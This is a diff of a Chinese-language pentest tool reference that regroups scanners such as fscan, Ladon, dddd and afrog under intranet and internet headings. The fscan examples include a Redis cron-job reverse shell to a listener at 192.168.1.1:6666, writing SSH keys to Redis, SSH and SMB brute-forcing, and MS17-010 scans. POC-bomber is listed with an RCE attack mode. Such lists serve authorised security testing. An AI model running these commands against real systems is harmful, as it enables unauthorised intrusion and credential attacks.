@@ -193,7 +193,42 @@ web系统
 	+ 批量查询：``./enscan -f f.txt``
 	+ 对外投资占股100%的公司：``./enscan -n 小米 -invest 100``
 
-互联网信息收集
+综合扫描-侧重内网
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ fscan
+	- 项目地址：``https://github.com/shadow1ng/fscan``
+	- 示例
+		::
+		
+			fscan.exe -h 192.168.1.1/24  (默认使用全部模块)  
+			fscan.exe -h 192.168.1.1/16  (B段扫描)
+			fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)  
+			fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)  
+			fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)  
+			fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)  
+			fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)  
+			fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)  
+			fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)   
+			fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )  
+			fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)  
+			fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)  
+			fscan64.exe -h 10.10.180.0-10.10.180.255 -p 445 -sc ms17|findstr "MS17-010"（指定模块）
+			fscan.exe -hf ip.txt  (以文件导入)
++ Template 
+	- 项目地址：https://github.com/1n7erface/Template
++ SweetBabyScan
+	- 项目地址：``https://github.com/inbug-team/SweetBabyScan``
+	- 轻量级内网资产探测漏洞扫描工具，支持弱口令爆破的内网资产探测漏洞扫描工具，集成了Xray与Nuclei的Poc
++ Ladon
+	- 项目地址：``https://github.com/k8gege/Ladon``
+	- 大型内网渗透扫描器\域渗透\横向工具，PowerShell模块、Cobalt Strike插件、内存加载、无文件扫描。内含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。
++ goon
+	- 项目地址（停止维护）：``https://github.com/i11us0ry/goon``
+	- goon,集合了fscan和kscan等优秀工具功能的扫描爆破工具。
+	- 功能包含：ip探活、port扫描、web指纹扫描、title扫描、fofa获取、ms17010、mssql、mysql、postgres、redis、ssh、smb、rdp、telnet等爆破以及如netbios探测等功能。
+
+
+综合扫描-侧重外网
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + ARL 资产侦察灯塔系统
 	::
@@ -205,6 +240,21 @@ web系统
 		docker-compose up -d 
 		
 		默认端口5003 (https), 默认用户名密码admin/arlpass
++ 带带弟弟
+	- 项目：``https://github.com/SleepingBag945/dddd``
+	- 示例：
+		::
+		
+			# 指定IP禁Ping全端口扫描指定端口
+			./dddd -t 172.16.100.1 -p 80,53,1433-5000 -Pn
+			先配置./config/subfinder-config.yaml中的FOFA 邮箱和KEY。
+				fofa: ["xxxx@qq.com:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
+			./dddd -t "domain=\"baidu.com\"" -fofa (从fofa取100个baidu.com域名的目标)
+			./dddd -t "domain=\"baidu.com\"" -fofa -ffmc 10000 (指定最大数量为10000 默认100)
++ Milkyway
+	+ 项目地址：https://github.com/polite-007/Milkyway
+	+ ``milkyway_windows_amd64.exe -f 1.txt -m -c 100``
+	+ ``milkyway_windows_amd64.exe -u www.baidu.com -m -c 100``
 + ShuiZe_0x727
 	- 项目：``https://github.com/0x727/ShuiZe_0x727``
 	- 协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点。
@@ -236,8 +286,19 @@ web系统
 		
 			P1finger.exe -uf urls.txt -httpproxy 127.0.0.1:4781
 			P1finger.exe -uf urls.txt -socks 127.0.0.1:4781
++ Railgun
+	- 项目地址：``https://github.com/lz520520/railgun``
+	- Railgun为一款GUI界面的渗透工具，将部分人工经验转换为自动化，集成了渗透过程中常用到的一些功能，目前集成了端口扫描、端口爆破、web指纹扫描、漏洞扫描、漏洞利用以及编码转换功能，后续会持续更新。
++ scan4all
+	- 项目地址： ``https://github.com/GhostTroops/scan4all``
+	- 15000+PoC漏洞扫描；[ 23 ] 种应用弱口令爆破；7000+Web指纹；146种协议90000+规则Port扫描；Fuzz、HW打点、BugBounty神器...
++ afrog
+	- 项目地址：``https://github.com/zan8in/afrog``
+	- 需要配置 ceye.io的key
+	- ``afrog -t http://127.0.0.1 -config config.yaml -o 1.html``
+	- ``afrog -T result.txt -config config.yaml -o 1.html``
 
-互联网漏洞扫描
+漏洞扫描
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 + xray【web】
 	- 全局配置
@@ -281,65 +342,11 @@ web系统
 			- ``xray_darwin_amd64 --log_level debug webscan --plugins xss,cmd_injection --basic-crawler http://example.com --json-output 1.json``
 			- ``xray_darwin_amd64 webscan --url http://example.com --data "x=y" --html-output 2.html --json-output 1.json``
 			- ``xray_darwin_amd64 webscan --url http://example.com/ --webhook-output http://host:port/path``
-+ afrog
-	- 项目地址：``https://github.com/zan8in/afrog``
-	- 需要配置 ceye.io的key
-	- ``afrog -t http://127.0.0.1 -config config.yaml -o 1.html``
-	- ``afrog -T result.txt -config config.yaml -o 1.html``
 + poc
 	- 项目地址：``https://github.com/tr0uble-mAker/POC-bomber``
 	- 验证模式：``python3 pocbomber.py -u http://xxx.xxx``
 	- 攻击模式：``python3 pocbomber.py -u http://xxx.xxx --poc="thinkphp2_rce.py" --attack``
 	- -f :指定目标url文件(这里有bug，文件中的url必须http(s)://开头)
-
-内网信息收集
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-+ 带带弟弟
-	- 项目：``https://github.com/SleepingBag945/dddd``
-	- 示例：
-		::
-		
-			# 指定IP禁Ping全端口扫描指定端口
-			./dddd -t 172.16.100.1 -p 80,53,1433-5000 -Pn
-			先配置./config/subfinder-config.yaml中的FOFA 邮箱和KEY。
-				fofa: ["xxxx@qq.com:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
-			./dddd -t "domain=\"baidu.com\"" -fofa (从fofa取100个baidu.com域名的目标)
-			./dddd -t "domain=\"baidu.com\"" -fofa -ffmc 10000 (指定最大数量为10000 默认100)
-+ fscan
-	- 项目地址：``https://github.com/shadow1ng/fscan``
-	- 示例
-		::
-		
-			fscan.exe -h 192.168.1.1/24  (默认使用全部模块)  
-			fscan.exe -h 192.168.1.1/16  (B段扫描)
-			fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)  
-			fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)  
-			fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)  
-			fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)  
-			fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)  
-			fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)  
-			fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)   
-			fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )  
-			fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)  
-			fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)  
-			fscan64.exe -h 10.10.180.0-10.10.180.255 -p 445 -sc ms17|findstr "MS17-010"（指定模块）
-			fscan.exe -hf ip.txt  (以文件导入)
-+ Template 
-	+ 项目地址：https://github.com/1n7erface/Template
-+ Milkyway
-	+ 项目地址：https://github.com/polite-007/Milkyway
-	+ ``milkyway_windows_amd64.exe -f 1.txt -m -c 100``
-	+ ``milkyway_windows_amd64.exe -u www.baidu.com -m -c 100``
-+ goon
-	- 项目地址：``https://github.com/i11us0ry/goon``
-	- goon,集合了fscan和kscan等优秀工具功能的扫描爆破工具。
-	- 功能包含：ip探活、port扫描、web指纹扫描、title扫描、fofa获取、ms17010、mssql、mysql、postgres、redis、ssh、smb、rdp、telnet等爆破以及如netbios探测等功能。
-+ SweetBabyScan
-	- 项目地址：``https://github.com/inbug-team/SweetBabyScan``
-	- 轻量级内网资产探测漏洞扫描工具，支持弱口令爆破的内网资产探测漏洞扫描工具，集成了Xray与Nuclei的Poc
-+ Ladon
-	- 项目地址：``https://github.com/k8gege/Ladon``
-	- 大型内网渗透扫描器\域渗透\横向工具，PowerShell模块、Cobalt Strike插件、内存加载、无文件扫描。内含端口扫描、服务识别、网络资产探测、密码审计、高危漏洞检测、漏洞利用、密码读取以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描等。
 
 子域爆破
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
